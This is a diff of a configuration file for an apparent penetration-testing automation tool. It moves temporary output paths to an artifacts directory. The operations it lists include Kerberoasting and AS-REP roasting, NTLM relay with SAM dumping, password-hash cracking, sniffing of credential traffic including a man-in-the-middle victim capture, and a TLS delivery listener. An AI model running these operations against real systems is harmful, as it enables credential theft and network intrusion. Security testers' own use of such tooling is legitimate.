@@ -540,7 +540,7 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'XML TLS Audit'
-args = ['--xml=/tmp/sslscan_{domain}.xml', '{domain}:{port}']
+args = ['--xml={artifacts}/sslscan_{domain}.xml', '{domain}:{port}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -2932,7 +2932,7 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'GraphQL Introspection'
-args = ['--max-time', '30', '-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"query":"{ __schema { types { name } } }"}', '{url}/graphql']
+args = ['--max-time', '30', '-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{{"query":"{{ __schema {{ types {{ name }} }} }}"}}', '{url}/graphql']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
@@ -5892,7 +5892,7 @@ network = false
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'JRMP Traffic Sniff'
-args = ['-i', 'eth0', '-Y', 'jrmp', '-a', '/tmp/jrmp.pcap']
+args = ['-i', 'eth0', '-Y', 'jrmp', '-a', '{artifacts}/jrmp.pcap']
 output = 'lines'
 network = false
 
@@ -6371,7 +6371,7 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'GraphQL Introspection'
-args = ['--max-time', '30', '-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"query":"{ __schema { types { name } } }"}', '{url}/graphql']
+args = ['--max-time', '30', '-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{{"query":"{{ __schema {{ types {{ name }} }} }}"}}', '{url}/graphql']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
@@ -8032,7 +8032,7 @@ network = true
 binary = 'openssl'
 [[capability.provider.operation]]
 name = 'Listener Cert Generate'
-args = ['req', '-x509', '-newkey', 'rsa:4096', '-keyout', 'key.pem', '-out', 'cert.pem', '-days', '365', '-nodes', '-subj', '/CN={lhost}']
+args = ['req', '-x509', '-newkey', 'rsa:4096', '-keyout', '{artifacts}/key.pem', '-out', '{artifacts}/cert.pem', '-days', '365', '-nodes', '-subj', '/CN={lhost}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8187,14 +8187,14 @@ network = true
 binary = 'openssl'
 [[capability.provider.operation]]
 name = 'TLS Staging Server'
-args = ['s_server', '-quiet', '-accept', '{port}', '-cert', 'cert.pem', '-key', 'key.pem']
+args = ['s_server', '-quiet', '-accept', '{port}', '-cert', '{artifacts}/cert.pem', '-key', '{artifacts}/key.pem']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ncat'
 [[capability.provider.operation]]
 name = 'TLS Delivery Listener'
-args = ['-lvnp', '{port}', '--ssl', '--ssl-cert', 'cert.pem', '--ssl-key', 'key.pem']
+args = ['-lvnp', '{port}', '--ssl', '--ssl-cert', '{artifacts}/cert.pem', '--ssl-key', '{artifacts}/key.pem']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -10593,7 +10593,7 @@ network = false
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Tmp Perms Check'
-args = ['-la', '/tmp/', '/var/tmp/', '/dev/shm/']
+args = ['-la', '{artifacts}/', '/var/tmp/', '/dev/shm/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10814,28 +10814,28 @@ network = true
 binary = 'mkdir'
 [[capability.provider.operation]]
 name = 'Mount Point Prep'
-args = ['-p', '/tmp/tsmnt']
+args = ['-p', '{artifacts}/tsmnt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'mount'
 [[capability.provider.operation]]
 name = 'NFS Mount Probe'
-args = ['-t', 'nfs', '{rhost}:/', '/tmp/tsmnt']
+args = ['-t', 'nfs', '{rhost}:/', '{artifacts}/tsmnt']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'mount'
 [[capability.provider.operation]]
 name = 'NFSv3 Mount Probe'
-args = ['-t', 'nfs', '-o', 'vers=3', '{rhost}:/', '/tmp/tsmnt']
+args = ['-t', 'nfs', '-o', 'vers=3', '{rhost}:/', '{artifacts}/tsmnt']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Mounted Content List'
-args = ['-la', '/tmp/tsmnt']
+args = ['-la', '{artifacts}/tsmnt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10856,7 +10856,7 @@ network = false
 binary = 'umount'
 [[capability.provider.operation]]
 name = 'Mount Teardown'
-args = ['/tmp/tsmnt']
+args = ['{artifacts}/tsmnt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10877,7 +10877,7 @@ network = false
 binary = 'stat'
 [[capability.provider.operation]]
 name = 'Mounted Root Perms'
-args = ['-c', '%a %U %G %n', '/tmp/tsmnt']
+args = ['-c', '%a %U %G %n', '{artifacts}/tsmnt']
 output = 'lines'
 network = false
 
@@ -11326,7 +11326,7 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'PHP Session Scan'
-args = ['-rl', '{marker}', '/var/lib/php/sessions/', '/tmp/']
+args = ['-rl', '{marker}', '/var/lib/php/sessions/', '{artifacts}/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11570,7 +11570,7 @@ network = true
 binary = 'gitleaks'
 [[capability.provider.operation]]
 name = 'Local Repo Secret Scan'
-args = ['detect', '--source', '.', '--report-format', 'json', '--report-path', '/tmp/gitleaks.json', '--no-git']
+args = ['detect', '--source', '.', '--report-format', 'json', '--report-path', '{artifacts}/gitleaks.json', '--no-git']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -11645,7 +11645,7 @@ network = true
 binary = 'GetNPUsers.py'
 [[capability.provider.operation]]
 name = 'ASREP Roast'
-args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep']
+args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '{artifacts}/asrep']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -11722,7 +11722,7 @@ network = true
 binary = 'describeTicket.py'
 [[capability.provider.operation]]
 name = 'Ticket Cache Inspect'
-args = ['/tmp/*.ccache']
+args = ['{artifacts}/*.ccache']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12216,7 +12216,7 @@ network = false
 binary = 'crunch'
 [[capability.provider.operation]]
 name = 'Wordlist Generate'
-args = ['4', '8', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '/tmp/genlist.txt']
+args = ['4', '8', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '{artifacts}/genlist.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12332,35 +12332,35 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NTLM Crack Pass'
-args = ['-m', '1000', '-a', '0', '/tmp/ntds.ntds', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '1000', '-a', '0', '{artifacts}/ntds.ntds', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Kerberoast Crack'
-args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '13100', '-a', '0', '{artifacts}/kerberoast.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'ASREP Crack'
-args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '18200', '-a', '0', '{artifacts}/asrep.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'NTDS Admin Account Filter'
-args = ['-E', 'administrator|admin|:(500):', '/tmp/ntds.ntds']
+args = ['-E', 'administrator|admin|:(500):', '{artifacts}/ntds.ntds']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cut'
 [[capability.provider.operation]]
 name = 'NTLM Hash Column Pull'
-args = ['-d', ':', '-f', '4', '/tmp/ntds.ntds']
+args = ['-d', ':', '-f', '4', '{artifacts}/ntds.ntds']
 output = 'lines'
 network = false
 
@@ -12490,7 +12490,7 @@ network = false
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Userlist Dedupe'
-args = ['-u', '-o', '/tmp/users_sorted.txt', '{wl:smb/users.txt}']
+args = ['-u', '-o', '{artifacts}/users_sorted.txt', '{wl:smb/users.txt}']
 output = 'lines'
 network = false
 
@@ -12763,7 +12763,7 @@ inputs = [
 binary = 'GetUserSPNs.py'
 [[capability.provider.operation]]
 name = 'SPN Harvest'
-args = ['{domain}/{username}:{password}@{rhost}', '-outputfile', '/tmp/kerberoast.out']
+args = ['{domain}/{username}:{password}@{rhost}', '-outputfile', '{artifacts}/kerberoast.out']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -12784,42 +12784,42 @@ network = true
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'Kerberoast via nxc'
-args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--kerberoasting', '/tmp/kerberoast.out']
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--kerberoasting', '{artifacts}/kerberoast.out']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Ticket Crack'
-args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wl:ad/passwords.txt}', '--potfile-disable']
+args = ['-m', '13100', '-a', '0', '{artifacts}/kerberoast.out', '{wl:ad/passwords.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Ticket Crack Rule'
-args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wl:ad/passwords.txt}', '-r', '{wl:rules/best66.rule}', '--potfile-disable']
+args = ['-m', '13100', '-a', '0', '{artifacts}/kerberoast.out', '{wl:ad/passwords.txt}', '-r', '{wl:rules/best66.rule}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Ticket Crack Alt'
-args = ['--wordlist={wl:ad/passwords.txt}', '--format=krb5tgs', '/tmp/kerberoast.out']
+args = ['--wordlist={wl:ad/passwords.txt}', '--format=krb5tgs', '{artifacts}/kerberoast.out']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'GetNPUsers.py'
 [[capability.provider.operation]]
 name = 'ASREP Harvest'
-args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep.out']
+args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '{artifacts}/asrep.out']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'ASREP Crack'
-args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wl:ad/passwords.txt}', '--potfile-disable']
+args = ['-m', '18200', '-a', '0', '{artifacts}/asrep.out', '{wl:ad/passwords.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12861,14 +12861,14 @@ network = false
 binary = 'describeTicket.py'
 [[capability.provider.operation]]
 name = 'Ticket Detail Inspect'
-args = ['/tmp/*.ccache']
+args = ['{artifacts}/*.ccache']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Ticket Realm Filter'
-args = ['-c', '{domain}', '/tmp/kerberoast.out']
+args = ['-c', '{domain}', '{artifacts}/kerberoast.out']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12885,7 +12885,7 @@ phase = 'credentials'
 label = 'WIFI HANDSHAKE CRACK'
 summary = 'Crack captured WPA handshakes and PMKIDs'
 inputs = [
-  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
+  { key = 'capture', type = 'file', required = false, default = '{artifacts}/capture.cap' },
 ]
 [[capability.provider]]
 binary = 'aircrack-ng'
@@ -12912,7 +12912,7 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'PMKID Crack 16800'
-args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
+args = ['-m', '16800', '-a', '0', '{artifacts}/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12961,7 +12961,7 @@ network = false
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'HC22000 Convert'
-args = ['-o', '/tmp/out.22000', '{capture}']
+args = ['-o', '{artifacts}/out.22000', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12982,7 +12982,7 @@ network = false
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Cracked Capture Decrypt'
-args = ['-w', '{wl:wifi/passphrases.txt}', '-l', '/tmp/crackkey.bin', '{capture}']
+args = ['-w', '{wl:wifi/passphrases.txt}', '-l', '{artifacts}/crackkey.bin', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -13020,28 +13020,28 @@ network = false
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Passphrase Crack'
-args = ['--wordlist={wl:ssh/passphrases.txt}', '/tmp/ssh.hash']
+args = ['--wordlist={wl:ssh/passphrases.txt}', '{artifacts}/ssh.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Show Cracked Pass'
-args = ['--show', '/tmp/ssh.hash']
+args = ['--show', '{artifacts}/ssh.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'RSA Key Crack'
-args = ['-m', '22921', '-a', '0', '/tmp/ssh.hash', '{wl:ssh/passphrases.txt}', '--potfile-disable']
+args = ['-m', '22921', '-a', '0', '{artifacts}/ssh.hash', '{wl:ssh/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Ed25519 Key Crack'
-args = ['-m', '22911', '-a', '0', '/tmp/ssh.hash', '{wl:ssh/passphrases.txt}', '--potfile-disable']
+args = ['-m', '22911', '-a', '0', '{artifacts}/ssh.hash', '{wl:ssh/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -13162,21 +13162,21 @@ network = false
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Zip Hash Crack'
-args = ['--wordlist={wl:passwords/rockyou.txt}', '/tmp/zip.hash']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '{artifacts}/zip.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Zip Hash Rule Crack'
-args = ['--wordlist={wl:passwords/rockyou.txt}', '--rules=Jumbo', '/tmp/zip.hash']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '--rules=Jumbo', '{artifacts}/zip.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Zip PKZIP Crack'
-args = ['-m', '17200', '-a', '0', '/tmp/zip.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '17200', '-a', '0', '{artifacts}/zip.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -13239,7 +13239,7 @@ network = false
 binary = '7z'
 [[capability.provider.operation]]
 name = 'Archive Extract Verified'
-args = ['x', '-ppassword', '-o/tmp/extracted', '{archive}']
+args = ['x', '-ppassword', '-o{artifacts}/extracted', '{archive}']
 output = 'lines'
 network = false
 
@@ -13276,14 +13276,14 @@ network = false
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Shadow Crack'
-args = ['--wordlist={wl:passwords/rockyou.txt}', '/tmp/unshadow.txt']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '{artifacts}/unshadow.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Shadow Show Cracked'
-args = ['--show', '/tmp/unshadow.txt']
+args = ['--show', '{artifacts}/unshadow.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -13555,7 +13555,7 @@ network = false
 binary = 'openssl'
 [[capability.provider.operation]]
 name = 'PKCS12 Key Export'
-args = ['pkcs12', '-in', 'cert.pfx', '-passin', 'pass:', '-nocerts', '-nodes', '-out', '/tmp/extracted.key']
+args = ['pkcs12', '-in', 'cert.pfx', '-passin', 'pass:', '-nocerts', '-nodes', '-out', '{artifacts}/extracted.key']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -13741,7 +13741,7 @@ inputs = [
 binary = 'gitleaks'
 [[capability.provider.operation]]
 name = 'Dir Secret Scan'
-args = ['detect', '--source', '{path}', '--no-git', '--report-format', 'json', '--report-path', '/tmp/leaks.json']
+args = ['detect', '--source', '{path}', '--no-git', '--report-format', 'json', '--report-path', '{artifacts}/leaks.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -13839,14 +13839,14 @@ network = false
 binary = 'gitleaks'
 [[capability.provider.operation]]
 name = 'Git History Scan'
-args = ['detect', '--source', '{path}', '--report-format', 'json', '--report-path', '/tmp/leaks_git.json']
+args = ['detect', '--source', '{path}', '--report-format', 'json', '--report-path', '{artifacts}/leaks_git.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Leak Report Inventory'
-args = ['-la', '/tmp/leaks*.json']
+args = ['-la', '{artifacts}/leaks*.json']
 output = 'lines'
 network = false
 
@@ -13870,7 +13870,7 @@ network = true
 binary = 'aws'
 [[capability.provider.operation]]
 name = 'S3 Anonymous Get Test'
-args = ['s3', 'cp', 's3://{bucket}/', '/tmp/probe_out/', '--recursive', '--no-sign-request', '--dryrun']
+args = ['s3', 'cp', 's3://{bucket}/', '{artifacts}/probe_out/', '--recursive', '--no-sign-request', '--dryrun']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -13999,14 +13999,14 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'JWT HS256 Crack'
-args = ['-m', '16500', '-a', '0', '/tmp/jwt.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '16500', '-a', '0', '{artifacts}/jwt.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'JWT None Mode'
-args = ['-m', '16511', '-a', '3', '/tmp/jwt_none.hash', '?a?a?a', '--potfile-disable']
+args = ['-m', '16511', '-a', '3', '{artifacts}/jwt_none.hash', '?a?a?a', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14353,14 +14353,14 @@ inputs = [
 binary = 'cewl'
 [[capability.provider.operation]]
 name = 'Site Keyword Pull'
-args = ['-d', '2', '-m', '4', '-w', '/tmp/cewl_out.txt', 'https://{domain}']
+args = ['-d', '2', '-m', '4', '-w', '{artifacts}/cewl_out.txt', 'https://{domain}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'cewl'
 [[capability.provider.operation]]
 name = 'Email Harvest Pull'
-args = ['-e', '-d', '2', '-w', '/tmp/cewl_emails.txt', 'https://{domain}']
+args = ['-e', '-d', '2', '-w', '{artifacts}/cewl_emails.txt', 'https://{domain}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -14381,14 +14381,14 @@ network = false
 binary = 'crunch'
 [[capability.provider.operation]]
 name = 'Pattern Generate'
-args = ['6', '10', 'abcde12345', '-o', '/tmp/gen.txt']
+args = ['6', '10', 'abcde12345', '-o', '{artifacts}/gen.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'maskprocessor'
 [[capability.provider.operation]]
 name = 'Mask Generate'
-args = ['?u?l?l?l?l?l?d?d?d?d', '--output-file=/tmp/mask.txt']
+args = ['?u?l?l?l?l?l?d?d?d?d', '--output-file={artifacts}/mask.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14409,7 +14409,7 @@ network = false
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Dedupe Sort'
-args = ['-u', '-o', '/tmp/sorted.txt', '{wl:passwords/rockyou.txt}']
+args = ['-u', '-o', '{artifacts}/sorted.txt', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14437,21 +14437,21 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Domain Keyword Filter'
-args = ['-i', '{domain}', '/tmp/cewl_out.txt']
+args = ['-i', '{domain}', '{artifacts}/cewl_out.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'kwprocessor'
 [[capability.provider.operation]]
 name = 'Keyboard Walk Generate'
-args = ['-z', '1', '-o', '/tmp/keywalk.txt']
+args = ['-z', '1', '-o', '{artifacts}/keywalk.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Merge Lists'
-args = ['/tmp/cewl_out.txt', '{wl:users/names.txt}']
+args = ['{artifacts}/cewl_out.txt', '{wl:users/names.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14468,7 +14468,7 @@ phase = 'credentials'
 label = 'WIRELESS CREDENTIAL AUDIT'
 summary = 'Extract and audit wireless credential material'
 inputs = [
-  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
+  { key = 'capture', type = 'file', required = false, default = '{artifacts}/capture.cap' },
 ]
 [[capability.provider]]
 binary = 'aircrack-ng'
@@ -14495,21 +14495,21 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'WPA PMKID Crack'
-args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
+args = ['-m', '16800', '-a', '0', '{artifacts}/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'Handshake Convert'
-args = ['-o', '/tmp/hc.22000', '{capture}']
+args = ['-o', '{artifacts}/hc.22000', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hcxhashtool'
 [[capability.provider.operation]]
 name = 'PMKID Extract'
-args = ['-r', '{capture}', '-o', '/tmp/pmkid.16800']
+args = ['-r', '{capture}', '-o', '{artifacts}/pmkid.16800']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14565,7 +14565,7 @@ network = false
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Capture Inventory'
-args = ['-la', '/tmp/*.cap']
+args = ['-la', '{artifacts}/*.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14589,7 +14589,7 @@ phase = 'credentials'
 label = 'HASH EXTRACTION PCAP'
 summary = 'Extract authentication material from captured traffic'
 inputs = [
-  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.pcap' },
+  { key = 'capture', type = 'file', required = false, default = '{artifacts}/capture.pcap' },
 ]
 [[capability.provider]]
 binary = 'tshark'
@@ -14679,14 +14679,14 @@ network = true
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Auth Traffic Capture'
-args = ['-i', 'eth0', '-w', '/tmp/authsniff.pcap', 'port', '80', 'or', 'port', '21', 'or', 'port', '110']
+args = ['-i', 'eth0', '-w', '{artifacts}/authsniff.pcap', 'port', '80', 'or', 'port', '21', 'or', 'port', '110']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Kerberos Traffic Capture'
-args = ['-i', 'eth0', '-w', '/tmp/kerbsniff.pcap', 'port', '88']
+args = ['-i', 'eth0', '-w', '{artifacts}/kerbsniff.pcap', 'port', '88']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -14707,7 +14707,7 @@ network = false
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Sniff Artifact Inventory'
-args = ['-la', '/tmp/*.pcap']
+args = ['-la', '{artifacts}/*.pcap']
 output = 'lines'
 network = false
 
@@ -14796,7 +14796,7 @@ network = true
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'SMB Signing Check'
-args = ['smb', '{cidr}', '--gen-relay-list', '/tmp/relay_targets.txt']
+args = ['smb', '{cidr}', '--gen-relay-list', '{artifacts}/relay_targets.txt']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -15306,21 +15306,21 @@ network = true
 binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'SMB Relay'
-args = ['-tf', '/tmp/relay_targets.txt', '-smb2support']
+args = ['-tf', '{artifacts}/relay_targets.txt', '-smb2support']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'SMB Relay Dump'
-args = ['-tf', '/tmp/relay_targets.txt', '-smb2support', '--dump-sam']
+args = ['-tf', '{artifacts}/relay_targets.txt', '-smb2support', '--dump-sam']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Ldap Relay Dump'
-args = ['-tf', '/tmp/relay_targets.txt', '-wh', 'wpad', '-6']
+args = ['-tf', '{artifacts}/relay_targets.txt', '-wh', 'wpad', '-6']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -15341,7 +15341,7 @@ network = true
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'Signing Check Relay Prep'
-args = ['smb', '{rhost}', '--gen-relay-list', '/tmp/relay_targets.txt']
+args = ['smb', '{rhost}', '--gen-relay-list', '{artifacts}/relay_targets.txt']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -15369,7 +15369,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '{artifacts}/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability]]
@@ -15428,7 +15428,7 @@ network = false
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Intercepted Traffic Capture'
-args = ['-i', '{iface}', '-w', '/tmp/mitm.pcap', 'host', '{victim}']
+args = ['-i', '{iface}', '-w', '{artifacts}/mitm.pcap', 'host', '{victim}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -15541,14 +15541,14 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv1 Crack'
-args = ['-m', '5500', '-a', '0', '/tmp/netntlmv1.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '5500', '-a', '0', '{artifacts}/netntlmv1.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '{artifacts}/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -15871,7 +15871,7 @@ network = false
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Set-Cookie Extract'
-args = ['-r', '/tmp/mitm.pcap', '-Y', 'http.setcookie', '-T', 'fields', '-e', 'http.set_cookie']
+args = ['-r', '{artifacts}/mitm.pcap', '-Y', 'http.setcookie', '-T', 'fields', '-e', 'http.set_cookie']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16608,42 +16608,42 @@ inputs = [
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'SMB Auth Capture'
-args = ['-i', '{iface}', '-w', '/tmp/smb.pcap', 'port', '445']
+args = ['-i', '{iface}', '-w', '{artifacts}/smb.pcap', 'port', '445']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Kerberos Capture'
-args = ['-i', '{iface}', '-w', '/tmp/krb.pcap', 'port', '88']
+args = ['-i', '{iface}', '-w', '{artifacts}/krb.pcap', 'port', '88']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'LDAP Capture'
-args = ['-i', '{iface}', '-w', '/tmp/ldap.pcap', 'port', '389']
+args = ['-i', '{iface}', '-w', '{artifacts}/ldap.pcap', 'port', '389']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'NTLM SSP Mine'
-args = ['-r', '/tmp/smb.pcap', '-Y', 'ntlmssp.auth.username', '-T', 'fields', '-e', 'ntlmssp.auth.username', '-e', 'ntlmssp.auth.domain']
+args = ['-r', '{artifacts}/smb.pcap', '-Y', 'ntlmssp.auth.username', '-T', 'fields', '-e', 'ntlmssp.auth.username', '-e', 'ntlmssp.auth.domain']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Kerberos User Mine'
